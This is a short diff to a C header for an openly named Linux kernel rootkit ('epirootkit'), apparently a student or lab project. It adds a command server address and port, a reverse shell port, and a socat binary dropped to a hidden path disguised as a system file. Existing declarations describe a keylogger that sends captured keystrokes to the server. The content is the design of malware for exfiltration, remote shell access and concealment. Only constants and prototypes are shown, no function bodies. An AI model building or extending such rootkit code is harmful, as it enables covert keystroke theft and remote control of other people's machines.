@@ -4,6 +4,12 @@
 #include <linux/types.h>
 
 // Configuration macros
+#define SERVER_IP "192.168.100.1"
+#define SERVER_PORT 4242
+#define REVERSE_SHELL_PORT 9001
+#define CONNEXION_MESSAGE "epirootkit: connexion established\n"
+#define SOCAT_BINARY_PATH "/tmp/.sysd"
+
 #define SUCCESS 0
 #define FAILURE 1
 #define MAX_SENDING_MSG_ATTEMPTS 10
@@ -46,6 +52,7 @@ int close_thread(void);									// Close the kernel thread
 int epikeylog_init(int keylog_mode);					// Initialize the keylogger
 int epikeylog_send_to_server(void);						// Send keylogger content to the server
 void epikeylog_exit(void);								// Cleanup function for the keylogger
+int drop_socat_binaire(void);							// Drop the socat binary in /tmp/.sysd
 
 extern char *ip;
 extern int port;
